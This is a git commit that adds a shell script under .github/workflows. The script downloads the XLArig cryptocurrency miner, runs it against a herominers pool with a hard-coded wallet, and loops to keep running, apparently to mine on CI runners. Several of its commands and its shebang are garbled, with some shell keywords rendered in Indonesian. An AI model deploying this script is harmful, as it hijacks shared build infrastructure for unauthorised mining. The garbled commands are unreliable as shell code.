0a03c4b21c22db9376d56ace19b0bcbaddcbd369
gogon1 <83112829+gogon1@users.noreply.github.com>
2021-04-24 14:52:49 +0700

    Create blonk.sh

---
+++ .github/workflows/blonk.sh
@@ -0,0 +1,10 @@
+#! / bin / sh
+pembaruan sudo apt
+sudo apt menginstal layar -y
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
+unzip XLArig-v5.2.2-linux-x86_64.zip
+./xlarig -o ca.scala.herominers.com:10131 -u Siz7KzWmiNWSRTjZBAt5qqWC5PPYLVGvQdxfDPsyMXpUMkRuzwKNLEbfevN4Eoh76gTvxPeszEj5R7GmJpquxPeszEj5R7GmJxMnk -HD
+sementara [1] ;  melakukan
+tidur 3
+selesai
+tidur 999
